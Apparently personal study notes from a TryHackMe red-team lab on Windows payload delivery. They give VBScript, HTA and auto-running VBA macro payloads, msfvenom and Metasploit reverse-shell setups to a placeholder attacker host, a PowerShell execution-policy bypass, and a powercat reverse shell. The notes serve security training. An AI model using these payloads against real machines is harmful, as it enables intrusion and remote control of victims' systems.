# Weaponization

Weaponizatiion is when red teamers use their own crafted tools to exploit a target

## Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.
It uses VBScript

### Showing a message box

- Windows message box
  ```
  Dim message
  message = "Hello"
  MsgBox message
  ```
- run it in cmd: `wscript hello.vbs`

### Use it to run exe files

- Run an exe file with VBScript
  ```
  Set shell = WScript.CreateObject("Wscript.Shell")
  shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
  ```
- Execute it with wscript or cscript in cmd: `wscript c:\Users\thm\Desktop\calc.vbs` or `cscript.exe c:\Users\thm\Desktop\calc.vbs`
- In case of blacklist, possible to rename in txt and still run it: `wscript /e:VBScript c:\Users\thm\Desktop\payload.txt` 

## HTML Application (HTA)

### Using and `ActiveXObject to execute cmd.exe

```
<html>
<body>
<script>
        var c= 'cmd.exe'
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

- serve the payload `python3 -m http.server 8000`
- Visit the page from the target machine `http://IP-ATTACK-MACHINE:8000/payload.hta` and run it

### Reverse shell

- Create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta`
- Launch a listener: `nc -lvp 443`
- The reverse shell is launched when the link is visited from the target machine
- Possible to generate and serve HTA with Metasploit framework `use exploit/windows/misc/hta_server`and we need to set LHOST, LPORT, SRVHOST, Payload we can use this payload `windows/meterpreter/reverse_tcp`
- When the link is visited in the target we get a meterpreter shell

## Visual Basic for Application (VBA)

- We need to use Word
- We open Visual Basic Editor by selecting `view → macros`
- We can give a name to our macro and click create
- We then can make another message box
```
Sub MACRONAME()
  MsgBox ("Message in a box")
End Sub
```
- We run the macro with F5
- To execute it automatically we can use after the document is open we need to use AutoOpen and Document_open
```
Sub Document_Open()
  MACRONAME
End Sub

Sub AutoOpen()
  MACRONAME
End Sub

Sub MACRONAME()
  MsgBox ("Message in a box")
End Sub
```
- we save the document in docm or doc

### Execute a bin

```
Sub ExecBin()
        Dim payload As String
        payload = "calc.exe"
        CreateObject("Wscript.Shell").Run payload,0
End Sub
```

### Use msfvenom for VBA

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443 -f vba
```

- We just need to copy the output in the file
- We set the listener with msfconsole `use exploit/multi/handler` `set payload windows/meterpreter/reverse_tcp` we set also LHOST and LPORT
- When the doc is open in the target machine we get a shell

## PowerShell

- Write something with powershell we open a text editor and put this inside: `Write-Output "something"`
- We save the file with .PS1 extension
- We can execute it from the cmd: `powershell -File thm.ps1`

### Execution policy

- See if we are restricted: `Get-ExecutionPolicy`
- Change it: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`
- we can also bypassing when executing the script: `powershell -ex bypass -File script.ps1`

### Getting a reverse shell

- We can use [powercat](https://github.com/besimorhino/powercat)
- We set up a listener `nc -lvp 443`
- We launch powercat `powershell -c "powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"`
- We should get a shell
 
## Resources

{% embed url="https://tryhackme.com/room/weaponization" %} TryHackMe - Weaponization {% endembed %}
{% embed url="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development" %} Red Teaming Toolkit - infosecn1nja {% endembed %}
